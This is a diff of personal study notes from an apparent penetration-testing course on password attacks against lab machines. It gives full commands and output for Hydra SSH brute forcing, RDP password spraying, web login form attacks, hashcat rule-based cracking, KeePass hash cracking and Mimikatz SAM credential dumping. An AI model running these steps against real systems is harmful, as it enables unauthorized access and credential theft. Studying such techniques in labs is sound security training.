@@ -95,6 +95,7 @@ Module 15 proves passwords remain the weakest link—apply these workflows caref
 As an example we will brute our first test VM.  We will attack ssh on port 2222 and attempt to determine the password for the user `george`.
 
 - Confirm the target is running SSH on port 2222.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ sudo nmap -sV -p 2222 192.168.241.201            
@@ -110,6 +111,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
 ```
+
 - The output indicates that SSH is open.
 - Let's assume through information gathering we already discovered the `george` user.
 	- *The format of the user name may suggest that the company uses the first name for account names. This information can assist us later to further our efforts.
@@ -118,6 +120,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
 	-  specify the port with `-s 2222`
 	-  set password list with `-P /usr/share/wordlists/rockyou.txt`
 	-  define target with `ssh://192.168.241.201`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
@@ -131,6 +134,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 09:34:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 09:34:46
 ```
+
 - We have successfully discovered a valid login for `george`
 - The dictionary attack worked because the password was contained in the `rockyou.txt` wordlist.
 - If we don't have a valid username.
@@ -148,6 +152,7 @@ In the next example we will use the **password spraying** technique to use a sin
   - Contains over 8000 usernames.
  - Set single password `-p "SuperS3cure1337#"`
  - Using RDP proto `rdp://192.168.241.202`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hydra -L name.lst -p "SuperS3cure1337#" rdp://192.168.241.202 
@@ -165,6 +170,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 13:35:
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 13:35:12
 ```
+
 - In this case we discover two usernames with the password we discovered in the DB leak.
 - This can reveal users with the same password across multiple systems.
 - We should always try to leverage every password we discover by spraying them across target systems.
@@ -195,6 +201,7 @@ In this example, we will perform a dict attack on the login form of a TinyFileMa
 		- We must also capture a failed login attempt so Hydra can differentiate between successful and failed login attempts.
 - Use Burp to intercept a login attempt.
  - Record the request body in the POST data.
+
 ```http
 POST / HTTP/1.1
 Host: 192.168.241.201
@@ -213,6 +220,7 @@ Connection: close
 
 fm_usr=test&fm_pwd=test
 ```
+
 - POST data.
 	- `fm_usr=test&fm_pwd=test`
 - We find a text string that appears in a failed login attempt GET.
@@ -231,6 +239,7 @@ fm_usr=test&fm_pwd=test
     - Try to avoid keywords like `password` or `username`
      - Modify the condition string as needed.
 - Launch our Hydra attack.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.241.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
@@ -244,6 +253,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 18:34:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 18:37:21
 ```
+
 - Our attack was succesful.
  - Password of `user` is `121212`
  - We can confirm by logging in.
@@ -258,6 +268,7 @@ Dict attacks can be highly effective if we begin with known info and take possib
 ###### Excersizes
 
 The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise.
+
 ```
 # Enumerate the running web server
 
@@ -344,9 +355,12 @@ App and user passwords are more often than not encrypted or hashed for protectio
 Unlike dict attacks, password cracking is quiet, doesn not lock accounts by failed attempts, and is unaffected by countermeasures.
 
 Example, if we gain access to a [SHA-256](https://en.wikipedia.org/wiki/SHA-2) password hash with value:
+
 ```5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
 ```
+
 We can use `sha256sum` to hash password attempts and compare the results.  If we hash `secret` twice and `secret1`, using `echo -n` to strip the newline (which would be added to the string, modifying the hash) we can see that the two `secret` hashes are the same.  The `secret1` hash is completely different, despite the similar input, showing us that plaintext `secret1` is not associated with the first hash.
+
 ```bash
 kali@kali:~$ echo -n "secret" | sha256sum
 2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
@@ -357,6 +371,7 @@ kali@kali:~$ echo -n "secret" | sha256sum
 kali@kali:~$ echo -n "secret1" | sha256sum
 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
 ```
+
 This is sufficient for us to understand the process, but unwieldy in execution.  There are tools available to us for streamlining the process, two of the most popular are:
 - Hashcat.
  - Mainly GPU based tool.
@@ -377,6 +392,7 @@ Before we begin, we can calculate the cracking time of various hashes by dividin
  - Result 62 variations for each plaintext char.
   - A 5 char password = 62^5 possible passwords.
    - 916132832 possibilities.
+
 ```bash
 kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
 62
@@ -384,10 +400,12 @@ kali@kali:~$ echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345
 kali@kali:~$ python3 -c "print(62**5)"
 916132832
 ```
+
 - Hashrate example.
  - How many calculations per second.
  - We can find this with Hashcats benchmark mode.
   - We will concentrate on MD5, SHA1, SHA-256 for this example.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hashcat -b
@@ -424,9 +442,11 @@ Speed.#1.........:   568.9 MH/s (14.51ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
 
 Speed.#1.........:   240.0 MH/s (34.80ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
 ```
+
 - The values are in MH/s.
  - 1 MH/s == 1,000,000 hashes per second.
 - We can run the benchmark on GPU.
+
 ```powershell
 C:\Users\admin\Downloads\hashcat-6.2.5>hashcat.exe -b
 hashcat (v6.2.5) starting in benchmark mode
@@ -455,12 +475,14 @@ Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1
 
 Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
 ```
+
 - Note the speed advantage of GPU.
 
 - Calculate a SHA256 cracking time.
  - Keyspace 62^5 = 916,132,832.
  - Hashrate = X MH/s * 1,000,000.
  - Output in seconds.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ python                                
@@ -478,10 +500,12 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> print(keyspace / gpu)
 0.09876058687192092
 ```
+
 - The calculations show we can calculate the entire keyspace of a 5 char password SHA256 in:
  - CPU: 3.8 seconds.
  - GPU: 0.1 seconds.
 - If we scale this up to 8 and 10 char password SHA256.
+
 ```
 >>> keyspace = 62**8
 >>> print(keyspace / gpu)
@@ -490,6 +514,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> print(keyspace / gpu)
 90477816.14095493
 ```
+
 - When converted from seconds the GPU will take.
  - 6.5 hours to calculate they keyspace of the 8 char password.
 	- 2.8 years for the 10 char!
@@ -517,6 +542,7 @@ For this example:
  - Special char.
  - Num val.
 - We can check the first 10 passwords of `rockyou.txt` to determine if they fit this requirement.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ head /usr/share/wordlists/rockyou.txt  
@@ -531,6 +557,7 @@ rockyou
 12345678
 abc123
 ```
+
 - None of the first 10 passwords comply to the policy.
  - We could use a rule function to mutate the passwords to fit the policy, but first we will familiarize with rule functions and how to use them on a basic example before applying to a complex wordlist.
 
@@ -540,6 +567,7 @@ abc123
  - Edit in place `-i`
  - Lines starting with 1 `^1`
  - Delete with `d`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ head /usr/share/wordlists/rockyou.txt > demo.txt
@@ -555,6 +583,7 @@ princess
 rockyou
 abc123
 ```
+
 - We now have 5 passwords that we will mutate to fit the policy.
 - [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
  - List of all rule functions with examples.
@@ -568,13 +597,16 @@ abc123
  - Therefore we will use rule function `$1` .
   - Create `demo.rule` with this function.
    - Escape the special char `$` to echo it correctly.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo \$1 > demo.rule
 ```
+
 - Now we can use Hascat with our wordlist mutation.
  - Provide rule file with `-r`
  - And `--stdout` to display mutated passwords in debug mode.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hashcat -r demo.rule --stdout demo.txt 
@@ -584,6 +616,7 @@ princess1
 rockyou1
 abc1231
 ```
+
 - Now for the uppercase char policy req.
 - When forced to use and upper case, many users capitalize the first letter.
  - Therefore we will use the `c` rule function to cap the first char and convert the rest to lower.
@@ -594,6 +627,7 @@ abc1231
   - If rules are on sep lines.
    - Hashcat will use each rule separately.
     - Resulting in two mutated passwords for each password in the list.
+
 ```bash
 kali@kali:~/passwordattacks$ cat demo1.rule     
 $1 c
@@ -618,9 +652,11 @@ princess1
 Princess
 ...
 ```
+
 - Now to add the special char.
 - We will start with `!`, a common special char.
  - Therefore we will add `$1` to our rule file.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo \$1 c \$! > demo1.rule
@@ -629,7 +665,9 @@ Princess
 └─$ cat demo1.rule             
 $1 c $!
 ```
+
 - We will make two rule file variations.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo \$1 c \$! > demo1.rule
@@ -665,6 +703,7 @@ Abc123!1
 ```
 
 With this basic understanding, let's assume we have retrieved an MD%:
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo -n "f621b6c9eab51a3e2f4e167fee4c6860" > crackme.txt
@@ -673,6 +712,7 @@ With this basic understanding, let's assume we have retrieved an MD%:
 └─$ cat crackme.txt      
 f621b6c9eab51a3e2f4e167fee4c6860 
 ```
+
 - We will use `rockyout.txt`
 - Modify for a policy including:
  - Upper case letter.
@@ -684,6 +724,7 @@ f621b6c9eab51a3e2f4e167fee4c6860
  - For num, the ever-popular `123`
 		- `$1 $2 $3`
   - Which we will follow with our special char.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo \$1 \$2 \$3 c \$! > demo3.rule 
@@ -692,12 +733,14 @@ f621b6c9eab51a3e2f4e167fee4c6860
 └─$ cat demo3.rule 
 $1 $2 $3 c $!
 ```
+
 - We will run Hshcast without debugging.
  - Set the hash type to MD5 with `-m 0`
  - Then the target hash file `crackme.txt`
  - And the `rockyou.txt` wordlist.
  - Followed by `-r` and our rule file.
  - Ending with `--force` to ingnore Hashcat warnings.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
@@ -736,6 +779,7 @@ Hardware.Mon.#1..: Temp: 39c Util: 12%
 Started: Sun Oct  1 08:44:14 2023
 Stopped: Sun Oct  1 08:44:30 2023
 ```
+
 - In this case we recover `Computer123!`
  - Not included in the default `rockyou.txt`
  - It only took hashcat a few seconds on CPU.
@@ -749,6 +793,7 @@ Stopped: Sun Oct  1 08:44:30 2023
  - Often relying on chars on the left side of the keyboard as they are easy to reach and type.
 
 Instead of creating rules ourselves, we can also use rules provided by Hashcat and other sources.  Hashcat includes a variety of rules in `/usr/share/hashcat/rules`.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ ls /usr/share/hashcat/rules        
@@ -767,6 +812,7 @@ oscommerce.rule              toggles5.rule
 rockyou-30000.rule           unix-ninja-leetspeak.rule
 specific.rule
 ```
+
 - The cover a wide range of mutations.
  - Most useful when we don't know the target's password policy.
  - We will use predefined rules in upcoming examples.
@@ -797,6 +843,7 @@ Begin by connecting to SALESWK01 lab machine via RDP, assuming we have obtained 
  - If we are unfamiliar, we should research it.
  - We discover the KeePass DB is stored as a `.kbdx` file.
   - Search the system for this extension.
+
 ```
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -813,6 +860,7 @@ Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a----         5/30/2022  10:33 AM           1982 Database.kdbx
 ```
+
 - User PowerShell.
 	- [Get-ChildItem](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem)
  - Search the whole drive with `-Path C:\`
@@ -830,6 +878,7 @@ Next, tranform the has into a format our cracking tool can use.
   - They can also format for Hashcat!
 
 We will use `keepass2john` to format the DB and save the output as `keepass.hash`.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ keepass2john Database.kdbx > keepass.hash
@@ -838,28 +887,33 @@ We will use `keepass2john` to format the DB and save the output as `keepass.hash
 └─$ cat keepass.hash            
 Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
 ```
+
 - Before we can work with it, we need to modify it further.
 - The JtR script prepended the filename `Database` to the hash.
  - It does this to act as the username for the hash.
   - Helpful when cracking DB hashes as we want the output to contain the username:password pairs.
  - Since KeePass uess a master password without a username we must remove the `Database:` string.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ cat keepass.hash
 $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
 ```
+
 - The hash is now in the correct format for Hashcat!
 
 Now we must determine the correct hash type.
 - To determine this hashtype.
  - We can look it up in the Hashcat wiki.
  - Or grep Hashcat help.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hashcat --help | grep -i "KeePass"
   13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
   29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
 ```
+
 - The correct mode appears to be `13400`
 
 We will skip step 3, cracking time calculation, since this is a simple example.
@@ -870,6 +924,7 @@ Next we prepare our wordlist.
  - This rule is highly effect with the rockyou wordlist as it was tailored for it.
 
 We have prepared everything and are ready to begin out attack!  Run Hashcat with the requisite arguments.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
@@ -902,6 +957,7 @@ Hardware.Mon.#1..: Temp: 57c Util: 97%
 Started: Sun Oct  1 10:21:22 2023
 Stopped: Sun Oct  1 10:22:18 2023
 ```
+
 - We have recovered `qwertyuiop123!`
 - Run KeePass on our target system and enter the master pass when prompted.
  - We now have access to all of the user's saved passwords.
@@ -943,6 +999,7 @@ We can elevate our privs to SYSTEM with tools like [PsExec](https://docs.microso
 Now let's demonstrate how to obtain and crack NTLM hashes.  We will retrieve passwords from the SAM of the MARKETINGWK01 machine, log in via RDP with the creds provided in the lab machine below.
 - Start with Get-LocalUser
 	- checking wich users exist locally on the system
+
 ```powershell
 PS C:\Users\offsec> Get-LocalUser
 
@@ -956,6 +1013,7 @@ offsec             True
 sam                True
 WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
 ```
+
 - The output indicates the existence of another user, `nelly`
 	- we will obtain nelly's plain text password by retrieving the NTLM hash and cracking it
 - We know the creds of users are stored when they log on to a Win sys
@@ -966,6 +1024,7 @@ WDAGUtilityAccount False   A user account managed and used by the system for Win
 	- Start PowerShell as Admin
 		- confirm the UAC popup
 	- start Mimikatz
+
 ```powershell
 PS C:\tools> .\mimikatz.exe
 
@@ -978,6 +1037,7 @@ PS C:\tools> .\mimikatz.exe
 
 mimikatz #
 ```
+
 - We can now interact with Mimikatz CLI env
 	- each command consists of a module and command delimited by two colons
 		- i.e. `privilege::debug`
@@ -987,6 +1047,7 @@ mimikatz #
 	- We can instead extract NTLM hashes from SAM with: `lsadump::sam`
 		- first gain SYSTEM privs with: `token::elevate`
 	- Both commands require **SeDebugPrivilege** which we attain with: `privilege::debug`
+
 ```bash
 mimikatz # privilege::debug
 Privilege '20' OK
@@ -1142,10 +1203,12 @@ Supplemental Credentials:
     OldCredentials
       des_cbc_md5       : 83abf758d62ae9d5
 ```
+
 - We have obtained the NTLM hash for nelly
 	- `3ae8e5f0ffabb3a627672e1600f1ba10`
 	- we will copy this to `nelly.hash` on our attacking machine
 - Next we get the correct hash mode from Hashcat for OS NTLM
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ echo -n "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash      
@@ -1161,6 +1224,7 @@ Supplemental Credentials:
   27100 | NetNTLMv2 (NT)                                             | Network Protocol
    1000 | NTLM                                                       | Operating System
 ```
+
 - the correct mode is `1000`
 - The Mimikatz output is already in a form that Hashcat accepts
 - Next we choose a wordlist and rule file
@@ -1168,6 +1232,7 @@ Supplemental Credentials:
 	- rule `best64.rule`
 		- containing 64 highly effective rules
 - Now we can start our attack
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
 └─$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -1200,5 +1265,6 @@ Hardware.Mon.#1..: Temp: 46c Util: 14%
 Started: Mon Oct  2 14:45:08 2023
 Stopped: Mon Oct  2 14:45:25 2023
 ```
+
 - we have retrieved `nicole1` from the NTLM hash
 
